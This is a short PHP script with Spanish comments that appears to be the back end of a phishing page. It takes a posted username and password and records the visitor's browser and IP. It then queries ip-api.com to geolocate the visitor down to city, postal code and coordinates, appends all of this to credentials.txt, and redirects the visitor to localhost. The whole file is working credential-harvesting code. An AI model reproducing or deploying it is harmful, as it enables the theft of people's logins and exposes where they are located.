<?php
if(isset($_POST['username']) && isset($_POST['password'])) {

  // Definimos variables Simples
  $username = $_POST['username'];
  $password = $_POST['password'];
  $browser = $_SERVER['HTTP_USER_AGENT'];
  $ip = $_SERVER['REMOTE_ADDR'];
  $dispositive = $_ENV['HTTP_USER_AGENT'];
  $fecha = date('d/m/y H:i:s');

  // Localización usuario
  // {status,message,continent,continentCode,country,region,regionName,city,district,zip,lat,lon,timezone,isp,org,mobile,query}
  $url = "http://ip-api.com/json/$ip?fields=66846719";
  $response = file_get_contents($url);
  $api_data = json_decode($response, true);
  $ciudad = $api_data['city'];
  $region = $api_data['regionName'];
  $pais = $api_data['country'];
  $c_postal = $api_data['zip'];
  $continente = $api_data['continent'];
  $latitud = $api_data['lat'];
  $longitud = $api_data['lon'];
  $proveedor = $api_data['isp'];
  $company = $api_data['org'];
  $mobile = $api_data['mobile'];


  // Creamos la data
  $data = "
Usuario: $username
Contraseña: $password
Navegador: $browser
IP: $ip
Región: $region
Pais: $pais
Ciudad: $ciudad
Códgo_postal: $c_postal
Latitud: $latitud
Longitud: $longitud
Proveedor: $proveedor
Compañia: $company
Fecha: $fecha \n
------------------------------------------------------
";

  // Guardamos la data
  file_put_contents("credentials.txt",$data, FILE_APPEND | LOCK_EX);

  // Hacemos redirect
  header("Location: http://localhost:80");
} else {
  echo "[+] A OCURRIDO UN ERROR 404";
}
?>
